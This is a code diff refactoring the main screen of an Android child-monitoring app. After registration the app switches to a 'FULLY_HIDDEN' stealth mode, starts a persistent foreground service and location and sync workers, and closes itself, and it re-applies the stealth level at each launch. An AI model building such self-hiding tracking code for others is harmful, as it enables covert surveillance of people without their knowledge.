@@ -7,33 +7,41 @@ import androidx.activity.compose.setContent
 import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.Surface
-import androidx.compose.material3.Text
 import androidx.compose.ui.Modifier
+import androidx.core.content.ContextCompat
 import androidx.navigation.compose.NavHost
 import androidx.navigation.compose.composable
 import androidx.navigation.compose.rememberNavController
+import com.abo7tb.childapp.data.local.SecurePrefsManager
 import com.abo7tb.childapp.service.ChildForegroundService
 import com.abo7tb.childapp.utils.StealthManager
+import com.abo7tb.childapp.worker.WorkerHelper
 import dagger.hilt.android.AndroidEntryPoint
+import timber.log.Timber
+import javax.inject.Inject
 
 @AndroidEntryPoint
 class MainActivity : ComponentActivity() {
 
-    @javax.inject.Inject
-    lateinit var securePrefsManager: com.abo7tb.childapp.data.local.SecurePrefsManager
+    @Inject
+    lateinit var securePrefsManager: SecurePrefsManager
 
-    @javax.inject.Inject
+    @Inject
     lateinit var stealthManager: StealthManager
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        
-        // Hide from recent apps if stealth mode is enabled
+
         window.setFlags(
             android.view.WindowManager.LayoutParams.FLAG_SECURE,
             android.view.WindowManager.LayoutParams.FLAG_SECURE
         )
-        
+
+        if (securePrefsManager.getUuid() != null) {
+            stealthManager.applyStoredLevel()
+            ensureBackgroundRunning()
+        }
+
         setContent {
             MaterialTheme {
                 Surface(
@@ -54,22 +62,10 @@ class MainActivity : ComponentActivity() {
                         composable("registration") {
                             com.abo7tb.childapp.ui.RegistrationScreen(
                                 onRegisterSuccess = {
-                                    // 1. Activate stealth mode
                                     stealthManager.setStealthLevel(StealthManager.StealthLevel.FULLY_HIDDEN)
-                                    
-                                    // 2. Start Foreground Service
-                                    val intent = Intent(this@MainActivity, ChildForegroundService::class.java)
-                                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                                        startForegroundService(intent)
-                                    } else {
-                                        startService(intent)
-                                    }
-                                    
-                                    // 3. Start Background Workers
-                                    com.abo7tb.childapp.worker.WorkerHelper.enqueueDailySyncWorkers(this@MainActivity)
-                                    com.abo7tb.childapp.worker.WorkerHelper.enqueueLocationWorker(this@MainActivity)
-                                    
-                                    // 4. Close the app
+                                    ensureBackgroundRunning()
+                                    WorkerHelper.enqueueAllWorkers(this@MainActivity)
+                                    Timber.d("MainActivity: registration complete, hiding app")
                                     finish()
                                 }
                             )
@@ -77,7 +73,11 @@ class MainActivity : ComponentActivity() {
                         composable("verify_parent") {
                             com.abo7tb.childapp.presentation.verify.VerifyParentScreen(
                                 onSuccess = {
-                                    finish() // Close or hide the app after verification
+                                    if (intent?.getBooleanExtra("from_secret_code", false) == true) {
+                                        finish()
+                                    } else {
+                                        finish()
+                                    }
                                 }
                             )
                         }
@@ -85,5 +85,11 @@ class MainActivity : ComponentActivity() {
                 }
             }
         }
+    }
+
+    private fun ensureBackgroundRunning() {
+        val serviceIntent = Intent(this, ChildForegroundService::class.java)
+        ContextCompat.startForegroundService(this, serviceIntent)
+        Timber.d("MainActivity: foreground service start requested")
     }
 }
